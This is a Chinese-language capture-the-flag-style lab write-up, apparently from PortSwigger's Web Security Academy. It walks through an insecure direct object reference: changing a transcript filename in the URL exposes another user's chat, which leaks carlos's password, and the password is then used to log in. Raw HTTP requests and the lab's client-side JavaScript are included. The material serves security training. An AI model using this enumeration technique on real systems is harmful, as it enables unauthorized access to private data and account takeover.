# 实验：不安全的直接对象引用

本实验将用户聊天记录直接存储在服务器的文件系统上，并使用静态 URL 检索它们。

通过找到用户 `carlos` 的密码并登录其账户来解决本实验。

## 步骤

探测
- 使用聊天功能，并使用其中的下载转录功能
    ```http
    POST /download-transcript HTTP/2
    Cookie: session=CxHFEn0F8ZrzYWFbfUEv5xknuSY9KSrY
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypz9KdEiOnJ39qdBu

    ------WebKitFormBoundarypz9KdEiOnJ39qdBu
    Content-Disposition: form-data; name="transcript"

    CONNECTED: -- Now chatting with Hal Pline --<br/>You: test<br/>Hal Pline: Please try and keep this place cleaner, I swear there are spiders living in my speaker
    ------WebKitFormBoundarypz9KdEiOnJ39qdBu--
    ```
    - 客户端 JS 脚本提取当前会话内容，并发送到转录端点

    - 服务器重定向
        ```http
        HTTP/2 302 Found
        Location: /download-transcript/2.txt
        ```

- 访问转录文件
    ```http
    GET /download-transcript/2.txt HTTP/2
    Cookie: session=CxHFEn0F8ZrzYWFbfUEv5xknuSY9KSrY
    ```
    - 服务器响应
        ```http
        HTTP/2 200 OK
        Content-Type: text/plain; charset=utf-8
        Content-Disposition: attachment; filename="2.txt"
        X-Frame-Options: SAMEORIGIN
        Content-Length: 160

        CONNECTED: -- Now chatting with Hal Pline --<br/>You: test<br/>Hal Pline: Please try and keep this place cleaner, I swear there are spiders living in my speaker
        ```
    - 服务器返回 URL 路径中的文件，其中包含之前的会话内容

- 尝试移除会话 cookie（之前并未登录，为匿名使用聊天功能），再访问转录下载功能
    - 仍可访问转录文件

- 尝试修改路径中的文件，以访问其他聊天记录
    ```http
    GET /download-transcript/1.txt HTTP/2
    ```
    - 服务器响应
        ```log
        CONNECTED: -- Now chatting with Hal Pline --
        You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
        Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
        You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
        Hal Pline: Takes one to know one
        You: Ok so my password is 2h76gebb4wd6y9hkq17k. Is that right?
        Hal Pline: Yes it is!
        You: Ok thanks, bye!
        Hal Pline: Do one!
        ```
    - 某个用户的密码在聊天中泄露 `2h76gebb4wd6y9hkq17k`

- 尝试使用得到的泄露密码登录 carlos 账户
    - 成功，结果之前的聊天用户为 carlos



## 额外：客户端代码

- `/chat`
    ```html
    <h1>
        Live chat
    </h1>
    <table id="chat-area" class="is-table-information">
    </table>
    <form id="chatForm" action="wss://id.web-security-academy.net/chat">
        <p>
            Your message:
        </p>
        <textarea id="message-box" name="message" maxlength=500>
    </textarea>
        <button class="button" type="submit">
            Send
        </button>
    </form>
    <script src="/resources/js/chat.js">
    </script>
    <script src="/resources/js/viewTranscript.js">
    </script>
    <script>
        viewTranscript('/download-transcript')
    </script>
    ```
    - 转录端点 `/download-transcript`
    - 聊天功能使用 ws

- `viewTranscript.js`

    ```js
    function viewTranscript(downloadTranscriptPath) {
        var chatForm = document.getElementById("chatForm");

        var viewTranscriptButton = document.createElement("button");
        viewTranscriptButton.setAttribute("id", "download-transcript");
        viewTranscriptButton.setAttribute("class", "button");
        viewTranscriptButton.innerText = "View transcript";
        viewTranscriptButton.onclick = viewTranscript;

        chatForm.appendChild(viewTranscriptButton)

        function viewTranscript() {
            var chatArea = document.getElementById("chat-area");
            var messages = chatArea.getElementsByClassName("message")
            var transcript = [];
            for (var i = 0; i < messages.length; i++) {
                var message = messages.item(i)
                transcript.push(message.getElementsByTagName("th").item(0).innerText + " " + message.getElementsByTagName("td").item(0).innerText)
            }

            var xhr = new XMLHttpRequest();
            xhr.onload = function() {
                window.location = xhr.responseURL;
            }
            xhr.open("POST", downloadTranscriptPath);
            data = new FormData();
            data.append("transcript", transcript.join("<br/>"));
            xhr.send(data);
        }
    };
    ```
    - 读取表单内容，格式化后发送到转录端点

- `chat.js`
    ```js
    (function() {
        var chatForm = document.getElementById("chatForm");
        var messageBox = document.getElementById("message-box");
        var webSocket = openWebSocket();

        messageBox.addEventListener("keydown", function(e) {
            if (e.key === "Enter" && !e.shiftKey) {
                e.preventDefault();
                sendMessage(new FormData(chatForm));
                chatForm.reset();
            }
        });

        chatForm.addEventListener("submit", function(e) {
            e.preventDefault();
            sendMessage(new FormData(this));
            this.reset();
        });

        function writeMessage(className, user, content) {
            var row = document.createElement("tr");
            row.className = className

            var userCell = document.createElement("th");
            var contentCell = document.createElement("td");
            userCell.innerHTML = user;
            contentCell.innerHTML = (typeof window.renderChatMessage === "function") ? window.renderChatMessage(content) : content;

            row.appendChild(userCell);
            row.appendChild(contentCell);
            document.getElementById("chat-area").appendChild(row);
        }

        function sendMessage(data) {
            var object = {};
            data.forEach(function(value, key) {
                object[key] = htmlEncode(value);
            });

            openWebSocket().then(ws => ws.send(JSON.stringify(object)));
        }

        function htmlEncode(str) {
            if (chatForm.getAttribute("encode")) {
                return String(str).replace(/['"<>&\r\n\\]/gi, function(c) {
                    var lookup = {
                        '\\': '&#x5c;',
                        '\r': '&#x0d;',
                        '\n': '&#x0a;',
                        '"': '&quot;',
                        '<': '&lt;',
                        '>': '&gt;',
                        "'": '&#39;',
                        '&': '&amp;'
                    };
                    return lookup[c];
                });
            }
            return str;
        }

        function openWebSocket() {
            return new Promise(res => {
                if (webSocket) {
                    res(webSocket);
                    return;
                }

                let newWebSocket = new WebSocket(chatForm.getAttribute("action"));

                newWebSocket.onopen = function(evt) {
                    writeMessage("system", "System:", "No chat history on record");
                    newWebSocket.send("READY");
                    res(newWebSocket);
                }

                newWebSocket.onmessage = function(evt) {
                    var message = evt.data;

                    if (message === "TYPING") {
                        writeMessage("typing", "", "[typing...]")
                    } else {
                        var messageJson = JSON.parse(message);
                        if (messageJson && messageJson['user'] !== "CONNECTED") {
                            Array.from(document.getElementsByClassName("system")).forEach(function(element) {
                                element.parentNode.removeChild(element);
                            });
                        }
                        Array.from(document.getElementsByClassName("typing")).forEach(function(element) {
                            element.parentNode.removeChild(element);
                        });

                        if (messageJson['user'] && messageJson['content']) {
                            writeMessage("message", messageJson['user'] + ":", messageJson['content'])
                        } else if (messageJson['error']) {
                            writeMessage('message', "Error:", messageJson['error']);
                        }
                    }
                };

                newWebSocket.onclose = function(evt) {
                    webSocket = undefined;
                    writeMessage("message", "System:", "--- Disconnected ---");
                };
            });
        }
    })();
    ```
    - 使用 ws 传输信息，从 JSON 中提取信息到新表格元素